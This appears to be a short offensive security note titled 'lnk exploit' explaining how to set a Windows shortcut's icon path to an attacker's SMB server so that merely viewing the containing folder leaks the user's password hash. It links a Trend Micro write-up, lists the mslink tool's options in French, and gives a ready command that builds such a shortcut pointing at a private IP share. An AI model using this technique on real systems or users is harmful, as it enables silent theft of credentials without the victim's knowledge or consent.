# lnk exploit
you can change the icon-path in a LNK-file and point it to a SMB-server capturing the users password-hash.

The beauty with this trick, is that the user don't even has to click the lnk. Opening a window displaying contents of a folder containing such a file, is enough.

[https://www.trendmicro.com/en\_us/research/17/e/rising-trend-attackers-using-lnk-files-download-malware.html](https://www.trendmicro.com/en_us/research/17/e/rising-trend-attackers-using-lnk-files-download-malware.html) 

First we create our lnk, using this excellent tool,

[http://www.mamachine.org/mslink/index.en.html](http://www.mamachine.org/mslink/index.en.html) 

\-l, --lnk-target               Précise la cible du raccourci  
\-o, --output-file              Enregistre le raccourci dans un fichier  
\-n, --name                     Spécifie une description au raccourci  
\-w, --working-dir              Spécifie le répertoire de lancement de la commande  
\-a, --arguments                Spécifie les arguments de la commande lancée  
\-i, --icon                     Spécifie le chemin de l'icône  
\-p, --printer-link             Génère un raccourci de type imprimante réseau

```text-plain
./mslink -l notimportant -n shortcut -i \\\\10.17.17.11\\test -o shortcut.lnk
```